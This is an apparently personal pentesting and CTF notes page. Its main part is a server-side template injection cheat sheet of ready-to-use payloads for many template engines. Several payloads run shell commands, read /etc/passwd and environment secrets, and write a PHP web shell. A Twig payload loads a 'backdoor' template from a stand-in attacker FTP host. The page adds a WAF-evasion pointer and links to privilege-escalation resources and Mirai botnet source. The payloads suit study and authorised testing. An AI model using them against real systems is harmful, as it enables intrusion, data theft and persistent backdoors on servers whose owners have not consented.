Intel (insert better title here)
================

- [Cheatsheets](#Cheatsheets)
- [Enumeration](#Enumeration)
- [Privelege Escalation](#Privilege-Escalation)
- [Steganography](#Steganography)
- [Cryptography](#Cryptography)
- [Reverse Engineering](#Reverse-Engineering)
- [Wordlists](#Wordlists)
- [Learn To](#Learn-To)

----------------------------------

# Cheatsheets

## Server Side Template Injection (SSTI)

### Polyglot:
```
${{<%[%'"}}%\
```

### FreeMarker (Java):
```
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```
### (Java):
```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```
### Twig (PHP):
```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```
### Smarty (PHP):
```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
````
### Handlebars (NodeJS):
```
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
### Velocity:
```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
### ERB (Ruby):
```
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```
### Django Tricks (Python):
{% debug %}
{{settings.SECRET_KEY}}
```
#Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```
### Mojolicious (Perl):
```
<%= perl code %>
<% perl code %>
```
### Flask/Jinja2: Identify:
```
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
```
### Flask/Jinja2: 
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```
### Jade:
```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
### Razor (.Net):
```
@(1+2)
@{// C# code}
```

If you need to evade WAF check this site out: https://gusralph.info/jinja2-ssti-research/


[Source](https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)
[More Useful Information](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
[Even More](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

# Enumeration

https://github.com/darkoperator/dnsrecon

# Privilege Escalation

## Windows

### Living off the Land
https://lolbas-project.github.io/

## Linux

### Living off the Land

https://gtfobins.github.io/



# Steganography

https://29a.ch/photo-forensics/#forensic-magnifier
https://futureboy.us/stegano/decinput.html
https://github.com/DominicBreuker/stego-toolkit
https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder
https://stegonline.georgeom.net/upload
https://lukeslytalker.pythonanywhere.com/

# Cryptography

https://gchq.github.io/CyberChef/cyberchef.htm
https://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript
http://fbcs.bplaced.net/multi_encoder_decoder.html
https://quipqiup.com/
https://mothereff.in/bacon
http://www.spammimic.com/
https://crypto.interactive-maths.com/affine-cipher.html

# Reverse Engineering

https://onlinedisassembler.com/static/home/index.html

# Wordlists

https://wiki.skullsecurity.org/Passwords

# Learn To

## Hack
https://app.hackthebox.eu/dashboard
https://www.hackthissite.org/
https://www.hacksplaining.com/
https://www.hacking-lab.com/index.html
https://cryptopals.com/
https://ocw.cs.pub.ro/courses/cns
https://www.pentesteracademy.com/
https://tryhackme.com/
https://learn.hacktify.in/collections?category=courses&page=1

## Code
http://www.codecraftgame.org/
https://codingbat.com/

# Misc (yet to sort)


https://www.semanticscholar.org/paper/Text-Steganographic-Approaches%3A-A-Comparison-Agarwal/5e9e19106b8deff39118530811672d7b0fb83670?p2df
https://github.com/jgamblin/Mirai-Source-Code

